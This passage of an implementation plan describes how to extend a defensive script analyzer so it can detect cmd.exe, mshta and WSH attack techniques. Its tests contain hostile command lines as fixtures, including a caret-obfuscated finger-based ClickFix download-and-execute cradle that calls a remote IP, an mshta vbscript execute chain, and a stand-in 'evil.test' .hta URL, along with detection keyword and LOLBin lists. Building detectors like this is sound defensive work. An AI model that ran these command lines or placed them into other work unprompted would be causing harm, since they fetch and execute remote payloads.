import { deobfuscateCaret } from './cmdlex'
```

```ts
function extractCmdBody(input: string): string {
  const m = input.match(/\/(?:c|k)\s+(.*)$/is)
  const body = m ? m[1] : input
  return deobfuscateCaret(body).trim()
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `npx vitest run shared/analyzer/__tests__/cmdlex.test.ts shared/analyzer/__tests__/preprocess.test.ts` then `npx vitest run`
Expected: PASS. The gating test still passes (now for the RIGHT reason — `deobfuscateCaret` exists but the cmd branch is structurally unreachable for a non-cmd interpreter, so it's never called). Task 3's cmd extraction tests (`cmd /c whoami` etc., no carets present) stay green since `deobfuscateCaret` is a no-op on caret-free text.

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer/cmdlex.ts shared/analyzer/preprocess.ts shared/analyzer/__tests__/cmdlex.test.ts shared/analyzer/__tests__/preprocess.test.ts
git commit -m "feat(analyzer): cmd.exe caret deobfuscation, interpreter-gated"
```

---

### Task 6: WSH numeric-char-code decode + honesty signals

**Files:**
- Create: `shared/analyzer/wsh.ts`
- Modify: `shared/analyzer/report.ts`
- Modify: `shared/analyzer/techniques.ts`
- Test: `shared/analyzer/__tests__/wsh.test.ts` (new)
- Test: `shared/analyzer/__tests__/techniques.test.ts` (extended)
- Test: `shared/analyzer/__tests__/integration.test.ts` (extended)

**Interfaces:**
- Consumes: `Interpreter` (Task 2); `RuleContext.interpreter` (Task 2); `SignatureRule`, `hasAny`, `triggerFor` (`techniques.ts`).
- Produces: `export function decodeNumericCharCodes(text: string): string` (`wsh.ts`). New `SignatureRule` ids `wsh-decode-limits`, `wsh-concat-eval-present` in `techniques.ts`'s `RULES`.

- [ ] **Step 1: Write the failing tests**

Create `shared/analyzer/__tests__/wsh.test.ts`:

```ts
// shared/analyzer/__tests__/wsh.test.ts
import { describe, expect, it } from 'vitest'
import { decodeNumericCharCodes } from '../wsh'

describe('decodeNumericCharCodes', () => {
  it('decodes a VBScript Chr() concat chain', () => {
    expect(decodeNumericCharCodes('Chr(72)&Chr(105)')).toBe('Hi')
  })

  it('decodes a JScript String.fromCharCode() call', () => {
    expect(decodeNumericCharCodes('String.fromCharCode(72,105)')).toBe('Hi')
  })

  it('does NOT touch a string-concat case — out of scope per §4', () => {
    expect(decodeNumericCharCodes('"a" & "b"')).toBe('"a" & "b"')
  })
})
```

Add to `shared/analyzer/__tests__/techniques.test.ts`:

```ts
describe('WSH honesty signals', () => {
  it('the unconditional WSH-limits notice fires for interpreter in {mshta, wscript, cscript} regardless of corpus content', () => {
    expect(ids('C:\\Users\\Public\\a.vbs', 'wscript C:\\Users\\Public\\a.vbs')).toContain('wsh-decode-limits')
    const wshCtx = buildContext('Chr(72)&Chr(105)', [], 'mshta')
    expect(classify(wshCtx).map((s) => s.id)).toContain('wsh-decode-limits')
  })

  it('the concat/eval presence-detector fires on VBScript concat, JScript concat, and Execute/eval', () => {
    expect(classify(buildContext('"po" & "wershell"', [], 'wscript')).map((s) => s.id)).toContain('wsh-concat-eval-present')
    expect(classify(buildContext('"a"+"b"', [], 'cscript')).map((s) => s.id)).toContain('wsh-concat-eval-present')
    expect(classify(buildContext('Execute("malicious")', [], 'mshta')).map((s) => s.id)).toContain('wsh-concat-eval-present')
  })

  it('neither WSH honesty signal fires for a plain PowerShell input (interpreter-gated)', () => {
    const sigs = classify(buildContext('"a" & "b" ; Execute("x")', [], 'powershell')).map((s) => s.id)
    expect(sigs).not.toContain('wsh-decode-limits')
    expect(sigs).not.toContain('wsh-concat-eval-present')
  })
})
```

Add to `shared/analyzer/__tests__/integration.test.ts`:

```ts
describe('WSH numeric char-code decode (§4)', () => {
  it('a Chr()-encoded mshta payload gets a decode layer and its own signals; a PS script with literal Chr() text is untouched', async () => {
    const mshta = await analyze('mshta vbscript:Execute(Chr(87)&Chr(83)&Chr(72))')
    expect(mshta.layers.some((l) => l.transform.includes('fromCharCode') || l.transform.includes('Chr'))).toBe(true)
    const ps = await analyze("Write-Host 'Chr(72)&Chr(105)'")
    expect(ps.layers.some((l) => l.transform.includes('Chr'))).toBe(false)
  })
})
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `npx vitest run shared/analyzer/__tests__/wsh.test.ts`
Expected: FAIL — `../wsh` doesn't exist. The `techniques.test.ts`/`integration.test.ts` additions fail too (`wsh-decode-limits`/`wsh-concat-eval-present` don't exist; no `Chr`-named layer is ever pushed).

- [ ] **Step 3: Write minimal implementation**

Create `shared/analyzer/wsh.ts`:

```ts
// shared/analyzer/wsh.ts
//
// Grammar-light numeric-char-code decode for VBScript/JScript payloads (§4) —
// Chr(72)&Chr(105) (VBScript) and String.fromCharCode(72,105) (JScript) ->
// their literal text. A regex-driven text->text transform, NOT a WSH
// lexer/interpreter: no string-concat folding, no Execute/eval recursion —
// both are explicit, bounded, out-of-scope follow-ups (spec §4's YAGNI cut).
// Interpreter-gated to mshta/wscript/cscript by its ONE call site in
// report.ts — Chr()/fromCharCode syntax has no PowerShell meaning.

function decodeChrChain(text: string): string {
  return text.replace(/Chr\(\d{1,3}\)(?:\s*&\s*Chr\(\d{1,3}\))*/gi, (chain) => {
    const codes = [...chain.matchAll(/Chr\((\d{1,3})\)/gi)].map((m) => Number(m[1]))
    return codes.map((c) => String.fromCharCode(c)).join('')
  })
}

function decodeFromCharCode(text: string): string {
  return text.replace(/String\.fromCharCode\(([\d,\s]+)\)/gi, (_m, args: string) => {
    const codes = args.split(',').map((s) => Number(s.trim())).filter((n) => !Number.isNaN(n))
    return codes.map((c) => String.fromCharCode(c)).join('')
  })
}

export function decodeNumericCharCodes(text: string): string {
  return decodeFromCharCode(decodeChrChain(text))
}
```

In `shared/analyzer/report.ts`, import `decodeNumericCharCodes` and wire it in as a new layer after the existing `-enc` Layer-N block (right before "Layer 2 (depth 1)" in the current file):

```ts
import { decodeNumericCharCodes } from './wsh'
```

```ts
const WSH_INTERPRETERS = new Set<Interpreter>(['mshta', 'wscript', 'cscript'])
```

```ts
  // Layer: WSH/HTA numeric char-code decode — interpreter-gated (§4).
  if (WSH_INTERPRETERS.has(interpreter)) {
    const decoded = decodeNumericCharCodes(current)
    if (decoded !== current) {
      layers.push({ index: layers.length, transform: 'Chr()/fromCharCode → text', text: decoded, state: 'fully-decoded' })
      current = decoded
    }
  }
```

In `shared/analyzer/techniques.ts`, add the two honesty rules to `RULES` (near the end of the table, before `lolbin`):

```ts
const WSH_HTA_INTERPRETERS: Interpreter[] = ['mshta', 'wscript', 'cscript']
```

```ts
  {
    id: 'wsh-decode-limits',
    label: 'WSH/HTA support is numeric char-code decode only; string-concatenation and Execute/eval are not resolved — a thin result here is not a clean result.',
    techniqueIds: [],
    baseSpecificity: 'weak',
    upgradesWith: [],
    test(ctx) {
      if (!WSH_HTA_INTERPRETERS.includes(ctx.interpreter)) return { hit: false }
      return { hit: true, trigger: ctx.interpreter }
    },
  },
  {
    id: 'wsh-concat-eval-present',
    label: 'string-concat / eval obfuscation present — not resolved; elevated suspicion warranted',
    techniqueIds: [],
    baseSpecificity: 'weak',
    upgradesWith: [],
    test(ctx) {
      if (!WSH_HTA_INTERPRETERS.includes(ctx.interpreter)) return { hit: false }
      const concat = /"[^"]*"\s*&\s*"[^"]*"/.test(ctx.text) || /"[^"]*"\s*\+\s*"[^"]*"/.test(ctx.text)
      const evalCall = hasAny(ctx, ['execute(', 'executeglobal(', 'eval('])
      if (!concat && !evalCall) return { hit: false }
      return { hit: true, trigger: triggerFor(ctx, ['execute(', 'executeglobal(', 'eval(']) }
    },
  },
```

(These carry `techniqueIds: []` — they are honesty/self-limiting notices about analyzer completeness, not MITRE technique detections, so no technique mapping applies. `baseSpecificity: 'weak'` keeps them out of `report.ts`'s near-dispositive characterization set, per the "no new characterization mechanics" constraint.)

- [ ] **Step 4: Run tests to verify they pass**

Run: `npx vitest run shared/analyzer/__tests__/wsh.test.ts shared/analyzer/__tests__/techniques.test.ts shared/analyzer/__tests__/integration.test.ts` then `npx vitest run`
Expected: PASS. `WSH_INTERPRETERS.has(interpreter)` is false for `powershell`/`unknown`/`cmd` (until wrapped down to a WSH-family interpreter via Task 4's re-entry), so the decode layer never appears on the PS path.

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer/wsh.ts shared/analyzer/report.ts shared/analyzer/techniques.ts shared/analyzer/__tests__/wsh.test.ts shared/analyzer/__tests__/techniques.test.ts shared/analyzer/__tests__/integration.test.ts
git commit -m "feat(analyzer): WSH/HTA numeric char-code decode + honesty signals"
```

---

### Task 7: Signatures + technique IDs

**Files:**
- Modify: `shared/analyzer/techniques.ts`
- Modify: `shared/analyzer/lolbins.ts`
- Test: `shared/analyzer/__tests__/techniques.test.ts`
- Test: `shared/analyzer/__tests__/lolbins.test.ts`

**Interfaces:**
- Consumes: `SignatureRule`, `hasAny`, `hasAll`, `present`, `triggerFor`, `RuleContext.interpreter` (Tasks 2/6); `LolbinEntry`, `matchLolbin` (`lolbins.ts`).
- Produces: new `SignatureRule` ids `cmd-cradle`, `mshta-interpreter`, `wsh-script-exec` in `techniques.ts`'s `RULES`; new `LolbinEntry` for `finger` in `lolbins.ts`'s `LOLBINS`; broadened `clickfix` decoy list (same rule id `clickfix`, extended data at `techniques.ts:177`).

- [ ] **Step 1: Write the failing tests**

Add to `shared/analyzer/__tests__/lolbins.test.ts`:

```ts
describe('finger LOLBin', () => {
  it('hits finger used as a download cradle inside a for /f loop', () => {
    const r = matchLolbin(ctx("for /f %e in ('finger user@45.9.148.20') do %e"))
    expect(r.hit).toBe(true)
    expect(r.techniqueIds).toContain('T1105')
  })

  it('does NOT hit a bare finger command (no discriminator)', () => {
    const r = matchLolbin(ctx('finger user@example.com'))
    expect(r.hit).toBe(false)
  })
})
```

Add to `shared/analyzer/__tests__/techniques.test.ts`:

```ts
describe('cmd-cradle', () => {
  it('fires on a for /f loop wrapping a download/exec inner command (finger)', () => {
    const s = analyze("for /f %e in ('finger user@45.9.148.20') do %e", "cmd /c for /f %e in ('finger user@45.9.148.20') do %e")
    const c = s.find((x) => x.id === 'cmd-cradle')
    expect(c).toBeTruthy()
    expect(c!.techniqueIds).toEqual(expect.arrayContaining(['T1059.003', 'T1105']))
  })

  it('fires on a for /f loop wrapping a nested powershell payload', () => {
    expect(ids("for /f %e in ('powershell -enc AAAA') do %e")).toContain('cmd-cradle')
  })

  it('benign twin: for /f alone (no download/exec inner command) does NOT fire', () => {
    expect(ids("for /f %i in ('dir /b') do echo %i")).not.toContain('cmd-cradle')
  })

  it('benign twin: for /f parsing robocopy/reg query output does NOT fire (FP pressure test)', () => {
    expect(ids('for /f "tokens=3" %a in (\'reg query HKCU\\Software /v Ver\') do echo %a')).not.toContain('cmd-cradle')
    expect(ids('for /f %f in (\'robocopy C:\\src C:\\dst /L\') do echo %f')).not.toContain('cmd-cradle')
  })

  it('co-occurrence upgrade: cmd-cradle + a broadened ClickFix decoy upgrades cmd-cradle to near-dispositive', () => {
    const script = "for /f %e in ('finger user@45.9.148.20') do %e & echo --Verify... press ENTER to continue"
    expect(specOf(script, 'cmd-cradle')).toBe('near-dispositive')
  })
})

describe('broadened ClickFix decoy phrases', () => {
  it('fires on "--Verify... press ENTER" style decoys from the live-test sample', () => {
    expect(ids('echo --Verify... press ENTER to continue')).toContain('clickfix')
  })
})

describe('mshta interpreter-aware rule', () => {
  it('fires when interpreter is mshta with a URL target', () => {
    const s = classify(buildContext('http://evil.test/x.hta', [], 'mshta'))
    const m = s.find((x) => x.id === 'mshta-interpreter')
    expect(m).toBeTruthy()
    expect(m!.techniqueIds).toContain('T1218.005')
  })

  it('dual-tags T1059.005 when the discriminator is an inline vbscript: scheme', () => {
    const s = classify(buildContext('vbscript:CreateObject("WScript.Shell").Run("calc.exe")', [], 'mshta'))
    const m = s.find((x) => x.id === 'mshta-interpreter')
    expect(m!.techniqueIds).toEqual(expect.arrayContaining(['T1218.005', 'T1059.005']))
  })

  it('benign twin: mshta with no URL/.hta/inline-script discriminator does NOT fire', () => {
    const s = classify(buildContext('about:blank', [], 'mshta'))
    expect(s.map((x) => x.id)).not.toContain('mshta-interpreter')
  })
})

describe('wscript/cscript script-execution rule', () => {
  it('fires on wscript launching a .vbs from a suspicious path with //E:', () => {
    const s = classify(buildContext('C:\\Users\\Public\\payload.vbs', [{ flag: '//E:vbscript', raw: '//E:vbscript', techniqueIds: ['T1059.005'] }], 'wscript'))
    const w = s.find((x) => x.id === 'wsh-script-exec')
    expect(w).toBeTruthy()
    expect(w!.techniqueIds).toContain('T1059.005')
  })

  it('fires on cscript launching a .js from a suspicious AppData path', () => {
    const s = classify(buildContext('C:\\Users\\bob\\AppData\\Roaming\\dropper.js', [], 'cscript'))
    expect(s.map((x) => x.id)).toContain('wsh-script-exec')
  })

  it('benign twin: wscript launching a .vbs from a trusted path with no //E: flag does NOT fire', () => {
    const s = classify(buildContext('C:\\Program Files\\LegitApp\\installer.vbs', [], 'wscript'))
    expect(s.map((x) => x.id)).not.toContain('wsh-script-exec')
  })
})
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `npx vitest run shared/analyzer/__tests__/techniques.test.ts shared/analyzer/__tests__/lolbins.test.ts`
Expected: FAIL — none of `cmd-cradle`, `mshta-interpreter`, `wsh-script-exec`, the `finger` LOLBin, or the broadened decoy phrases exist yet.

- [ ] **Step 3: Write minimal implementation**

In `shared/analyzer/lolbins.ts`, add the `finger` entry and the `start` documentation comment:

```ts
export const LOLBINS: LolbinEntry[] = [
  { bin: 'certutil', context: ['-urlcache', '-verifyctl', 'http://', 'https://'], techniqueIds: ['T1105'] },
  { bin: 'bitsadmin', context: ['/transfer', '/addfile', 'http://', 'https://'], techniqueIds: ['T1105', 'T1197'] },
  { bin: 'mshta', context: ['http://', 'https://', 'javascript:', 'vbscript:', '.hta'], techniqueIds: ['T1218.005'] },
  { bin: 'regsvr32', context: ['/i:http', 'scrobj', '/u ', 'http://', 'https://'], techniqueIds: ['T1218.010'] },
  { bin: 'rundll32', context: ['javascript:', 'url.dll', 'shell32.dll', 'mshtml'], techniqueIds: ['T1218.011'] },
  { bin: 'msiexec', context: ['/i http', '/i https', '/q', '/package http'], techniqueIds: ['T1218.007'] },
  { bin: 'wmic', context: ['process call create', '/node:', 'format:http'], techniqueIds: ['T1047'] },
  { bin: 'installutil', context: ['/logfile', '/u ', '.exe'], techniqueIds: ['T1218.004'] },
  { bin: 'conhost', context: ['--headless'], techniqueIds: ['T1059.001'] },
  // finger.exe fetching a payload via a for /f download/exec cradle — the
  // discriminator is real co-occurrence with the cradle shape, not a bare
  // mention (finger alone is used for legitimate directory-protocol lookups).
  { bin: 'finger', context: ['for /f', 'do %'], techniqueIds: ['T1105'] },
  // NOTE: `start` is intentionally NOT a standalone LOLBin entry — it's a
  // companion discriminator only, usable inside cmd-cradle/clickfix's own
  // test() functions. `start notepad.exe` alone is unremarkable; registering
  // it here would fire on ordinary benign shell usage.
]
```

In `shared/analyzer/techniques.ts`, broaden the `clickfix` decoy list (`techniques.ts:177`):

```ts
      const decoy = hasAny(ctx, ['verify you are human', 'i am not a robot', 'ray id', 'captcha', 'press win+r', 'press enter to verify', '--verify'])
```

Add `cmd-cradle` to `RULES` (after `download-cradle`, `techniques.ts:70-83`, so the two download-cradle-shaped rules sit together):

```ts
  {
    id: 'cmd-cradle',
    label: 'cmd.exe download/exec cradle',
    techniqueIds: ['T1059.003', 'T1105'],
    baseSpecificity: 'strong',
    upgradesWith: ['clickfix', 'evasion-cluster'],
    test(ctx) {
      // Discriminator: the for /f loop construct alone must not fire — it
      // needs a download/exec inner command co-occurring, exactly as a bare
      // iwr/curl alone doesn't fire download-cradle without an IEX sink.
      const loop = hasAny(ctx, ['for /f'])
      const inner = hasAny(ctx, ['finger', 'curl', 'certutil', 'bitsadmin', 'powershell', 'pwsh'])
      if (loop && inner) return { hit: true, trigger: triggerFor(ctx, ['for /f']) }
      return { hit: false }
    },
  },
```

Add `mshta-interpreter` and `wsh-script-exec` to `RULES` (near the `lolbin` entry, since both are interpreter-aware promotions of the generic LOLBin match):

```ts
const MSHTA_DISCRIMINATORS = ['http://', 'https://', 'javascript:', 'vbscript:', '.hta']
```

```ts
  {
    id: 'mshta-interpreter',
    label: 'mshta execution',
    techniqueIds: ['T1218.005'],
    baseSpecificity: 'strong',
    upgradesWith: ['clickfix', 'download-cradle'],
    test(ctx) {
      // interpreter === 'mshta' is itself the discriminator that distinguishes
      // this from a mere LOLBin text mention; a URL/.hta/inline-script target
      // is still required — the "bin AND discriminator" contract, never a
      // bare invocation.
      if (ctx.interpreter !== 'mshta') return { hit: false }
      if (!hasAny(ctx, MSHTA_DISCRIMINATORS)) return { hit: false }
      const inlineScript = hasAny(ctx, ['vbscript:', 'javascript:'])
      const techniqueIds = inlineScript ? ['T1218.005', 'T1059.005'] : ['T1218.005']
      return { hit: true, trigger: triggerFor(ctx, MSHTA_DISCRIMINATORS), techniqueIds }
    },
  },
  {
    id: 'wsh-script-exec',
    label: 'WSH script execution',
    techniqueIds: ['T1059.005', 'T1059.007'],
    baseSpecificity: 'strong',
    upgradesWith: ['clickfix', 'download-cradle'],
    test(ctx) {
      if (ctx.interpreter !== 'wscript' && ctx.interpreter !== 'cscript') return { hit: false }
      const suspiciousPath = hasAny(ctx, ['\\appdata\\', '\\temp\\', '\\public\\', '\\programdata\\'])
      const inlineEval = hasAny(ctx, ['//e:'])
      if (!suspiciousPath && !inlineEval) return { hit: false }
      const vbs = /\.vbs\b/i.test(ctx.text)
      const js = /\.js\b/i.test(ctx.text)
      if (!vbs && !js) return { hit: false }
      return { hit: true, trigger: triggerFor(ctx, ['.vbs', '.js', '//e:']), techniqueIds: vbs ? ['T1059.005'] : ['T1059.007'] }
    },
  },
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `npx vitest run shared/analyzer/__tests__/techniques.test.ts shared/analyzer/__tests__/lolbins.test.ts` then `npx vitest run`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer/techniques.ts shared/analyzer/lolbins.ts shared/analyzer/__tests__/techniques.test.ts shared/analyzer/__tests__/lolbins.test.ts
git commit -m "feat(analyzer): cmd-cradle, finger, mshta, and WSH signature rules"
```

---

### Task 8: End-to-end integration + determinism

**Files:**
- Test: `shared/analyzer/__tests__/integration.test.ts`

**Interfaces:**
- Consumes: `analyze()` (`report.ts`, unchanged public signature since Task 4). No production code changes — this task closes the gap with a direct reproduction of the spec §0 live-test finding plus a determinism sweep.

- [ ] **Step 1: Write the failing test**

Add to `shared/analyzer/__tests__/integration.test.ts`:

```ts
describe('closes the live-test gap (spec §0)', () => {
  const CLICKFIX_LIVE_TEST_FIXTURE =
    "cmd.exe /c for /f %e in ('f^inger user@45.9.148.20') do cmd.exe /c %e & echo --Verify... press ENTER to continue"

  it('the caret-obfuscated finger/for-f ClickFix sample now yields cmd-cradle + finger signals, the widened ClickFix signal, and no cmd.exe-as-domain IOC', async () => {
    const r = await analyze(CLICKFIX_LIVE_TEST_FIXTURE)
    const ids = r.signals.map((s) => s.id)
    expect(ids).toContain('cmd-cradle')
    expect(ids).toContain('lolbin') // the finger LOLBin, data-driven via matchLolbin
    expect(ids).toContain('clickfix')
    expect(r.iocs.map((i) => i.raw)).not.toContain('cmd.exe')
  })
})

describe('determinism across every new interpreter path', () => {
  const fixtures = [
    'cmd /c for /f %e in (\'finger user@45.9.148.20\') do %e',
    'mshta vbscript:Execute(Chr(87)&Chr(83)&Chr(72))',
    'wscript //E:vbscript C:\\Users\\Public\\payload.vbs',
    'cscript //E:jscript C:\\Users\\Public\\payload.js',
  ]

  it.each(fixtures)('same input -> identical AnalysisResult (minus checkedAt) for %s', async (input) => {
    const a = await analyze(input)
    const b = await analyze(input)
    const strip = (r: Awaited<ReturnType<typeof analyze>>) => ({ ...r, checkedAt: '' })
    expect(strip(a)).toEqual(strip(b))
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run shared/analyzer/__tests__/integration.test.ts`
Expected: before Tasks 1–7 land, this FAILS (no `cmd-cradle`/interpreter-aware signals exist, and the `cmd.exe`-as-domain FP is present). After Tasks 1–7 land (this task runs last), it should already PASS — this task is confirmation, not new production code.

- [ ] **Step 3: Confirm — no implementation step**

If it fails at this point, that means a spec requirement was missed by Tasks 1–7; return to the relevant task rather than patching ad hoc here.

- [ ] **Step 4: Run the FULL suite to verify everything passes together**

Run: `npx vitest run` and `tsc -b`
Expected: PASS — all pre-existing 86 specs plus every new spec from Tasks 1–8, and a clean `tsc -b` (the `Interpreter` union and `preprocess()`'s widened return type must type-check across every call site touched by this plan).

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer/__tests__/integration.test.ts
git commit -m "test(analyzer): end-to-end multi-interpreter integration + determinism coverage"
```

---

## Self-Review

**1. Spec coverage:**

| Spec section | Task |
|---|---|
| §1 Interpreter model | Task 2 |
| §2 Per-interpreter body extraction (table) | Task 3 |
| §2.1 Nested interpreter re-entry | Task 4 |
| §3 Caret deobfuscation (`cmdlex.ts`) | Task 5 |
| §4 WSH/HTA numeric decode + honesty signals | Task 6 |
| §5 Signatures + technique IDs | Task 7 |
| §6 Extract IOC-leak fix | Task 1 |
| §7 Unchanged/binding invariants | Global Constraints (every task inherits them); no task violates determinism/no-eval/data-boundary/reserved-colour |
| §8 Terminology disambiguation | Global Constraints + every code comment in this plan uses "cmd.exe interpreter"/"the cmd branch", never bare "cmd syntax" |
| §9 Build sequencing | Task order 1→2→3→4→5→6→7→8 respects the dependency chain (1 independent; 2 prerequisite for 3–7; 3→5 for the caret call-site; 2→4 for re-entry; 2→6 for WSH gating; 2(+3/6 benefit) →7 for signatures; 8 last) |
| §10 Testing | Every fixture named in §10 has a corresponding test in Tasks 1–8 (detectInterpreter positives+unknown+path-prefix; PS-byte-identical regression; cmdlex's 5 cases incl. the gating test; WSH decode's 4 cases; extraction fixtures incl. WSH flags; extract.ts's binary-filename fixture; techniques.ts's cmd-cradle/finger/clickfix/co-occurrence/benign-twin fixtures incl. the robocopy/reg-query FP pressure test; lolbins.ts's finger fixtures; mshta/wscript/cscript positive+benign-twin; WSH honesty signals' 3 cases; nested re-entry's decode+depth-cap; integration's live-test closure + determinism; `tsc -b` gate in Task 8) |

No spec section was left unmapped.

**2. Placeholder scan:** No "TBD"/"TODO"/"add validation"/"handle edge cases"/"similar to Task N" phrasing appears in any step. Every code step shows the actual implementation; every test step shows actual assertions. The one legitimate open call — WSH numeric-decode's module boundary (spec §4 explicitly leaves it as "an implementation-task decision, not a design decision") — is resolved concretely in Task 6 (new `wsh.ts`), not left open.

**3. Type consistency:**
- `Interpreter` (Task 2, `preprocess.ts`) is the same union used in `types.ts`'s `RuleContext.interpreter` (Task 2), `techniques.ts`'s `buildContext()` third parameter and `MSHTA_DISCRIMINATORS`/`WSH_HTA_INTERPRETERS` checks (Tasks 2, 6, 7), and `report.ts`'s `WRAPPER_INTERPRETERS`/`WSH_INTERPRETERS` sets and `reenterNestedInterpreter()` signature (Tasks 4, 6) — no renamed variant anywhere.
- `preprocess()`'s return shape (`{ script, encoded, flags, interpreter }`, fixed in Task 2) is consumed identically by Task 3 (extends `script` computation only), Task 4 (`reenterNestedInterpreter` calls `preprocess(script)` and destructures the same four fields), and Task 5 (only touches `extractCmdBody`, called from within `preprocess()`, no shape change).
- `deobfuscateCaret` (Task 5) and `decodeNumericCharCodes` (Task 6) are each called from exactly one site (`preprocess.ts`'s cmd branch; `report.ts`'s WSH-gated layer block respectively) — matching the "single call site" gate requirement for both.
- `EvasionFlag` used in Task 3's `extractWshBody` signature and Task 4's `reenterNestedInterpreter` return type is the same type from `types.ts` used throughout the existing codebase (no local redefinition).

No inconsistencies found; no fixes were needed beyond what's already reflected in the steps above.

**Residual gaps (explicitly out of scope, not silently dropped — matches spec §4's own YAGNI list):** a full VBScript/JScript lexer, WSH string-concat folding, VBScript `Execute`/JScript `eval` recursion, and cmd.exe environment-variable substring/reassembly obfuscation (`%COMSPEC:~10,1%`) are NOT implemented by this plan — spec §4 names them as bounded follow-ups, and Task 6's `wsh-concat-eval-present` signal is the honesty mechanism that stands in for them this increment.
